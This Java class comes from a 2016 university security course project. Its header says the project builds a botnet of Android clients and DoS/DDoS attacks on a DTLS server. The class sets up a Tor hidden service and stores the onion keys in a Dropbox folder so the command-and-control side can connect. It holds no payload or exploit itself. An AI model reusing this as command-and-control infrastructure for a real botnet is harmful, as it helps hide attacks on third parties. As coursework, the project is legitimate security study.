/**
 *                     Πανεπιστήμιο Αιγαίου
 *      Τμήμα Μηχανικών Πληροφοριακών & Επικοινωνιακών Συστημάτων
 * 
 *          Ασφάλεια Ασύρματων & Κινητών Δικτύων Επικοινωνιών
 *                     Εαρινό Εξάμηνο 2016
 *                      Project Μαθήματος
 * 
 * Δημιουργία secure botnet με android clients & Dos/DDoS σε DTLS Server.
 * 
 *          Πέππας Κωνσταντίνος 321/2011134 - icsd11134@icsd.aegean.gr
 *          Σωτηρέλης Χρήστος   321/2012182 - icsd12182@icsd.aegean.gr
 *          Χαϊκάλης Νικόλαος   321/2012200 - icsd12200@icsd.aegean.gr
 * 
 *          Καθηγητής Μαθήματος: Γ. Καμπουράκης 
 * 
 */

import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.silvertunnel_ng.netlib.api.NetFactory;
import org.silvertunnel_ng.netlib.api.NetLayer;
import org.silvertunnel_ng.netlib.api.NetLayerIDs;
import org.silvertunnel_ng.netlib.api.NetSocket;
import org.silvertunnel_ng.netlib.layer.tor.TorHiddenServicePortPrivateNetAddress;
import org.silvertunnel_ng.netlib.layer.tor.TorHiddenServicePrivateNetAddress;
import org.silvertunnel_ng.netlib.layer.tor.TorNetLayerUtil;
import org.silvertunnel_ng.netlib.layer.tor.TorNetServerSocket;

/**
 * class pou setarw to Tor Connection san server.
 */
public class TorConnection implements Serializable{
    private NetSocket netSocket;
    private int port;
    private ObjectOutputStream oos;
    private ObjectInputStream ois;
    private TorNetLayerUtil torNetLayerUtil;
    private TorHiddenServicePrivateNetAddress newNetAddress;

    //Constructor gia to an o user thelei na dinei oos, ois, port
    public TorConnection(ObjectOutputStream oos, ObjectInputStream ois, int port) {
        this.oos = oos;
        this.ois = ois;
        this.port = port;
    }

    //Constructor gia to an thelei na dwsei mono port:
    public TorConnection(int port) {
        this.port = port;
    }
    
    //Constructor gia to an o user thelei na dwsei mono oos, ois

    public TorConnection(ObjectOutputStream oos, ObjectInputStream ois) {
        this.oos = oos;
        this.ois = ois;
    }
    

    //default Constructor:
    public TorConnection() {}
    
    /**
     * Stin method auto anevazw sto Dropbox mu se ena fakelo onion to 
     * createNewTorHiddenServicePrivateNetAddress() (hostname, private_key)
     * gia na ta katevasei o CnC gia na ksekinisei to connection 
     */
    public void newOnion(){
        try {
            // create new private+public hidden service key
            torNetLayerUtil = TorNetLayerUtil.getInstance();
            newNetAddress = torNetLayerUtil.createNewTorHiddenServicePrivateNetAddress();
            //File directory = new File("C:\\Users\\Alcohealism\\Documents\\NetBeansProjects\\BotMaster_Android\\Onion");
            File directory = new File("D:\\Alcohealism\\Dropbox\\Onion");
            directory.mkdir();
            torNetLayerUtil.writeTorHiddenServicePrivateNetAddressToFiles(directory, newNetAddress);
            System.out.println("uploading:: " + newNetAddress.getPublicOnionHostname() + "\n");
        } catch (IOException ex) {
            Logger.getLogger(TorConnection.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    public void EstablishTorConnection(){
        try {
            torNetLayerUtil = TorNetLayerUtil.getInstance();
            //File directory = new File("C:\\Users\\Alcohealism\\Documents\\NetBeansProjects\\BotMaster_Android\\Onion");
            File directory = new File("D:\\Alcohealism\\Dropbox\\Onion");
            TorHiddenServicePrivateNetAddress netAddress = torNetLayerUtil.readTorHiddenServicePrivateNetAddressFromFiles(directory, true);
            TorHiddenServicePortPrivateNetAddress netAddressWithPort = new TorHiddenServicePortPrivateNetAddress(netAddress, port);
            NetLayer netLayer = NetFactory.getInstance().getNetLayerById(NetLayerIDs.TOR);
            netLayer.waitUntilReady();
            TorNetServerSocket netServerSocket = (TorNetServerSocket)netLayer.createNetServerSocket(null, netAddressWithPort);

            netSocket = netServerSocket.accept();
            System.out.println("TOR connection is ready.");
            try {
                oos = new ObjectOutputStream(netSocket.getOutputStream());
                ois = new ObjectInputStream(netSocket.getInputStream());
            } catch (Exception e) {
                System.out.println("Establish Connection Error");
                //close();
            }   
        } catch (IOException ex) {
        Logger.getLogger(TorConnection.class.getName()).log(Level.SEVERE, null, ex);
            //close();
        }

    }
    
    public void StopConnection(){
        try {
            if(oos != null) oos.close();
            if(ois != null) ois.close();
            if(netSocket !=null) netSocket.close();
        } catch (IOException ex) {
            return;
        }
    }

    //Gets / Sets :
    public int getPort() {
        return port;
    }

    public NetSocket getNetSocket() {
        return netSocket;
    }

    public void setNetSocket(NetSocket netSocket) {
        this.netSocket = netSocket;
    }

    public void setPort(int port) {
        this.port = port;
    }

    public ObjectOutputStream getOos() {
        return oos;
    }

    public void setOos(ObjectOutputStream oos) {
        this.oos = oos;
    }

    public ObjectInputStream getOis() {
        return ois;
    }

    public void setOis(ObjectInputStream ois) {
        this.ois = ois;
    }

    public TorNetLayerUtil getTorNetLayerUtil() {
        return torNetLayerUtil;
    }

    public void setTorNetLayerUtil(TorNetLayerUtil torNetLayerUtil) {
        this.torNetLayerUtil = torNetLayerUtil;
    }

    public TorHiddenServicePrivateNetAddress getNewNetAddress() {
        return newNetAddress;
    }

    public void setNewNetAddress(TorHiddenServicePrivateNetAddress newNetAddress) {
        this.newNetAddress = newNetAddress;
    }
    
    
}
